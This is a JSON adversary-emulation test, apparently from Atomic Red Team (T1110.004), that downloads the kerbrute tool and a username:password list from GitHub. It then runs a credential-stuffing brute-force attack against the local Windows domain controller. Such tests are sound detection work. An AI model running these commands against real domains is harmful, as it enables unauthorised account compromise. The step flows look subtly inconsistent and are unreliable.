@@ -1,0 +1,145 @@
+{
+  "id": "4852c630-87a9-409b-bb5e-5dc12c9ebcde",
+  "name": "Brute Force:Credential Stuffing using Kerbrute Tool",
+  "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5e387230-fe43-49ca-b5b5-0948eeee1185",
+      "type": "execute-command",
+      "data": {
+        "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "89a0780b-794b-4076-906f-20a4c25b4cd6",
+      "name": "Check dependency 1/2",
+      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "28c708ae-4de7-4e5b-905d-c0cc02be15e2",
+      "name": "Resolve dependency 1/2",
+      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d43a7bcf-4c22-463a-b9d1-aae9660e0c48",
+      "name": "Re-check dependency 1/2",
+      "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "57a61845-2871-4d7d-9fb1-4eebbb98332a",
+      "name": "Check dependency 2/2",
+      "description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1cdf063f-db83-4e53-83b5-ba990556e7d8",
+      "name": "Resolve dependency 2/2",
+      "description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e2b3cbc5-4be5-45f1-bad5-3cc803494964",
+      "name": "Re-check dependency 2/2",
+      "description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "89a0780b-794b-4076-906f-20a4c25b4cd6",
+      "p": "on-success",
+      "o": "5e387230-fe43-49ca-b5b5-0948eeee1185"
+    },
+    {
+      "s": "89a0780b-794b-4076-906f-20a4c25b4cd6",
+      "p": "on-failure",
+      "o": "28c708ae-4de7-4e5b-905d-c0cc02be15e2"
+    },
+    {
+      "s": "28c708ae-4de7-4e5b-905d-c0cc02be15e2",
+      "p": "on-success",
+      "o": "d43a7bcf-4c22-463a-b9d1-aae9660e0c48"
+    },
+    {
+      "s": "d43a7bcf-4c22-463a-b9d1-aae9660e0c48",
+      "p": "on-failure",
+      "o": "5e387230-fe43-49ca-b5b5-0948eeee1185"
+    },
+    {
+      "s": "57a61845-2871-4d7d-9fb1-4eebbb98332a",
+      "p": "on-success",
+      "o": "5e387230-fe43-49ca-b5b5-0948eeee1185"
+    },
+    {
+      "s": "57a61845-2871-4d7d-9fb1-4eebbb98332a",
+      "p": "on-failure",
+      "o": "1cdf063f-db83-4e53-83b5-ba990556e7d8"
+    },
+    {
+      "s": "1cdf063f-db83-4e53-83b5-ba990556e7d8",
+      "p": "on-success",
+      "o": "e2b3cbc5-4be5-45f1-bad5-3cc803494964"
+    },
+    {
+      "s": "e2b3cbc5-4be5-45f1-bad5-3cc803494964",
+      "p": "on-failure",
+      "o": "5e387230-fe43-49ca-b5b5-0948eeee1185"
+    }
+  ],
+  "tags": [
+    "T1110.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domaincontroller",
+      "type": "string",
+      "description": "Domain controller where test will be run",
+      "value": "$ENV:userdnsdomain"
+    },
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "Domain where you will be testing",
+      "value": "$ENV:userdomain"
+    }
+  ]
+}
